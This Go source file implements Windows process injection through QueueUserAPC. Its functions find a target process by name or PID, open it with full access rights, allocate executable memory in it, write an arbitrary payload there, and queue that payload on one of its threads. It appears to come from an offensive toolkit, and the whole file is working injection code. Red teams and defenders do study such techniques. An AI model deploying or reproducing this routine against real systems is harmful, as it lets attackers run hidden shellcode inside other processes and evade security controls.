package main

import "os"
import "fmt"
import "syscall"
import "unsafe"


func GetThreads(pid uintptr) []uint32 {
   var thread_ids_slice []uint32;
   snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPTHREAD, 0)
   if err != nil {
         fmt.Println("[-] Error calling CreateToolhelp32Snapshot:", err);
   }

   type ThreadEntry32 struct {
      Size           uint32
      tUsage         uint32
      ThreadID       uint32
      OwnerProcessID uint32
      BasePri        int32
      DeltaPri       int32
      Flags          uint32
   }

   var te ThreadEntry32;
   te.Size = uint32(unsafe.Sizeof(te));
   Thread32First(uintptr(snapshot), uintptr(unsafe.Pointer(&te)));
 
   for{

      if (Thread32Next(uintptr(snapshot), uintptr(unsafe.Pointer(&te))) == 0) { break }
      if (te.OwnerProcessID == uint32(pid)){
         thread_ids_slice = append(thread_ids_slice, te.ThreadID)
      }
   }
   CloseHandle(uintptr(snapshot));
   return thread_ids_slice;
}


func QueueUserAPC_Injection(process_name string, pid int, payload []byte) {
   // Get PID
   if ((process_name == "") && (pid == 0)){
      fmt.Println("[-] Process name or PID is necessary. ");
      os.Exit(-1);
   }
   var pid_uintptr uintptr;
   if (process_name != "") {
      fmt.Println("[+] Process name: \t\t", process_name);   
      var proc_handles_slice []uintptr = GetProcessByName(process_name);
      if (len(proc_handles_slice) < 1){
         fmt.Println("[-] No PID returned for process name:", process_name, "\n[-] Try adding \".exe\" at the end of the process name.");
         os.Exit(-1);
      } else {
         var first_proc = proc_handles_slice[0];
         pid_uintptr = GetProcessId(first_proc);   
      }
   } else{
         pid_uintptr = uintptr(pid)
   }
   fmt.Println("[+] Process PID: \t\t", pid_uintptr);

   // OpenProcess
   var proc_handle uintptr = OpenProcess(0x001F0FFF, 0, pid_uintptr);
   if (proc_handle == 0){
      fmt.Println("[-] OpenProcess API call failed. ");
      os.Exit(-1);
   }
   fmt.Println("[+] Process handle: \t\t", fmt.Sprintf("0x%x", proc_handle));

   // VirtualAllocEx
   var assigned_address uintptr = VirtualAllocEx(proc_handle, 0, uintptr(len(payload)), 0x1000, 0x20);
   if (assigned_address == 0){
      fmt.Println("[-] VirtualAllocEx API call failed. ");
      os.Exit(-1);
   }
   fmt.Println("[+] Assigned address: \t\t", fmt.Sprintf("0x%x", assigned_address));

   // WriteProcessMemory
   var res uintptr = WriteProcessMemory(proc_handle, assigned_address, uintptr(unsafe.Pointer(&payload[0])), uintptr(len(payload)));
   if (res == 0){
      fmt.Println("[-] WriteProcessMemory API call failed. ");
      os.Exit(-1);
   }
   fmt.Println("[+] WriteProcessMemory response:", res);

   // OpenThread
   var thread_ids_slice []uint32 = GetThreads(pid_uintptr);
   var first_thread uint32 = thread_ids_slice[0];
   fmt.Println("[+] First thread:\t\t", first_thread);
   var thread_handle uintptr = OpenThread(0x0010, 0, first_thread);
   fmt.Println("[+] Thread handle:\t\t", thread_handle, "(", fmt.Sprintf("0x%x", thread_handle), ")");

   // QueueUserAPC
   var queueUserAPC_res uintptr = QueueUserAPC(assigned_address, thread_handle, 0);
   fmt.Println("[+] queueUserAPC_res:\t\t", queueUserAPC_res);

   // CloseHandle
   CloseHandle(thread_handle);
   CloseHandle(proc_handle);
}